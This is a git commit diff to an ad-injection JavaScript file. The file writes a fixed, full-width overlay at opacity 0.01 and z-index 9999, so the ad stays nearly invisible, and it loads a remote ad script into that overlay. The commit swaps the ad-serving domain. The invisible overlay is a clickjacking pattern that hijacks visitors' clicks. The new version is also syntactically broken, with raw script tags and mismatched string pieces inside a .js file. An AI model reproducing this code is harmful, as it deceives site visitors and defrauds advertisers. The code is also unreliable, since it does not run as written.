da0e95f72644ce38b44f11c34a41c761114295c7
DayB4r <nitans404@gmail.com>
2025-09-05 10:59:56 +0700

    Update adfolatopsv2.js

--- ad/adfolatopsv2.js
+++ ad/adfolatopsv2.js
@@ -1,14 +1,17 @@
 document.write('<div id="floatads" style="width:100%;margin:auto; text-align:center;float:none;overflow:hidden; display:scroll;position:fixed; top:0;z-index:9999;opacity:0.01">');
 document.write('<div style="text-align:center;display:block;max-width:729px;height:auto;overflow:hidden;margin:auto;">');
 
-atOptions = {
-    'key': 'b7de6d42176768af896d8cf77e8f7bb7',
-    'format': 'iframe',
-    'height': 90,
-    'width': 728,
-    'params': {}
-};
-document.write('<scr' + 'ipt type="text/javascript" src="//abackdamstubborn.com/b7de6d42176768af896d8cf77e8f7bb7/invoke.js"></scr' + 'ipt>');
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'b7de6d42176768af896d8cf77e8f7bb7',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//chordbelievingpossible.com/b7de6d42176768af896d8cf77e8f7bb7/invoke.js"></scr' + 'ipt>');
 
 document.write('</div>');
 document.write('</div>');
+
